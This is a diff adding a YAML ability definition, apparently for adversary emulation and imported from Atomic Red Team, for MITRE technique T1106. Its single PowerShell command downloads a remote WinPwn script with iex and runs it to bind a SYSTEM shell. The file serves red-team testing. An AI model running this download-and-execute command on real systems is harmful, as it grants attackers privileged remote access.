@@ -1,0 +1,26 @@
+- id: 7ec5b74e-8289-4ff2-a162-b6f286a33abd
+  name: WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique
+  description: Get SYSTEM shell - Bind System Shell using CreateProcess technique
+    via function of WinPwn
+  tactic: execution
+  technique:
+    attack_id: T1106
+    name: Native API
+  platforms:
+    windows:
+      psh:
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - execution
+  - t1106
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2017-05-31T21:31:17.472Z'
+    atomic_guid: 7ec5b74e-8289-4ff2-a162-b6f286a33abd
+    import_timestamp: '2025-06-24T11:15:03.166949Z'
